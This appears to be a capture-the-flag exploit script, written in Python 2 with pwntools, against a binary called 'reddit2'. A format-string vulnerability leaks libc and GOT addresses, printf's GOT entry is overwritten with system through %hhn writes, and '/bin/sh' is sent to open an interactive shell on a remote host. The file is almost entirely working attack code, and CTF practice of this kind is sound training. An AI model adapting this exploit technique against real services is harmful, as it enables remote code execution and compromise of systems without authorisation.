#!/usr/bin/env python
from pwn import *


#CANARY    : ENABLED
#FORTIFY   : disabled
#NX        : ENABLED
#PIE       : ENABLED
#RELRO     : Partial

#every loop buffer = buffer - 576
#first loop can get __libc_start_main+243 in %151$x

while True:
	reddit2 = ELF('./reddit2')
	lib = ELF('./libc.so.6-32')


	r = remote('192.168.31.25',44001)
	#r = process('./reddit2')
	#print r.proc.pid


	r.readuntil('subreddits:')
	r.send('%142$x.%151$x\n')
	res = r.readuntil('that')
	functionbase_ebx  = res.split('.')[0]
	__libc_start_main = int(res.split('reddit')[0].split('.')[1].split('\n')[0] , 16) -243


	lib_base = __libc_start_main - lib.symbols['__libc_start_main']
	lib_system = lib_base + lib.symbols['system']
	hex_sys = hex(lib_system)
	b1 = int( hex_sys[-2:],16)
	b2 = int( hex_sys[-4:-2],16)
	b3 = int( hex_sys[-6:-4],16)
	b4 = int( hex_sys[-8:-6],16)

	GP = int(functionbase_ebx,16) + 0x14   # printf got index = 0x14
	print 'got_bass =',hex(GP)
	if '00' in hex(GP):
		print 'Has null byte, try again'
		continue
	fmt0 = '%'+ str( ( b1 - 16 + 256 ) % 256) + 'c%6$hhn'
	fmt1 = '%'+ str( ( b2 - b1 + 256 ) % 256) + 'c%7$hhn'
	fmt2 = '%'+ str( ( b3 - b2 + 256 ) % 256) + 'c%8$hhn'
	fmt3 = '%'+ str( ( b4 - b3 + 256 ) % 256) + 'c%9$hhn'

	payload = p32(GP) + p32(GP+1) + p32(GP+2) + p32(GP+3) + fmt0 + fmt1 + fmt2 + fmt3

	r.send(payload + '\n')
	r.recvline()
	r.send('/bin/sh')
	break

r.interactive()
